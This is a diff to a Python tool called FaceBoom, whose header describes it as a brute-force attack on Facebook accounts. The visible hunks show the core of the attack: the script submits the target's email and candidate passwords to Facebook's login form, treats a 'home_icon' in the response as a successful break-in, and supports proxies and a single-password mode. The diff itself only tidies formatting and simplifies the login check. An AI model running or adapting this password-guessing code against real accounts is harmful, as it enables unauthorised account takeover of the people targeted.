@@ -1,18 +1,20 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-
 ######################
 # SCRIPT : Facebom
 #    JOB : Brute Force Attack On Facebook Accounts
 #Codedby : Oseid Aldary
 ######################
+
 import socket, sys, os, re, random, optparse, time
+
 ## COLORS ###############
 wi="\033[1;37m" #>>White#
 rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
 yl="\033[1;33m" #>Yellow#
 #########################
+
 os.system("cls||clear")
 errMsg = lambda msg: rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi
 
@@ -51,6 +53,7 @@ class FaceBoom(object):
         if not self.cnet():
             print(errMsg("Please Check Your Internet Connection"))
             sys.exit(1)
+            
         if self.proxy:
              print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(self.proxy if not ":" in self.proxy else self.proxy.split(":")[0]))
              if self.proxy.count(".") != 3:
@@ -114,8 +117,7 @@ class FaceBoom(object):
         self.br.form['email']=self.target
         self.br.form['pass']=password
         self.br.method ="POST"
-        if self.br.submit().get_data().__contains__(b'home_icon'):return True
-        return False
+        return  self.br.submit().get_data().__contains__(b'home_icon')
 
     def banner(self):
 
@@ -141,6 +143,7 @@ class FaceBoom(object):
         if self.target_profile:
             self.get_profile_id
             sys.exit(1)
+            
         if self.target:
             self.banner()
             if self.singal_passwd:
@@ -149,7 +152,7 @@ class FaceBoom(object):
                     print(errMsg("Invalid Password"))
                     sys.exit(1)
                 try:
-                  sys.stdout.write(wi+"["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
+                  sys.stdout.write(wi+"\n["+yl+"~"+wi+"] Trying Single Password[ {"+yl+str(passwd)+wi+"} ]")
                   sys.stdout.flush()
                   if self.login(passwd):
                      sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
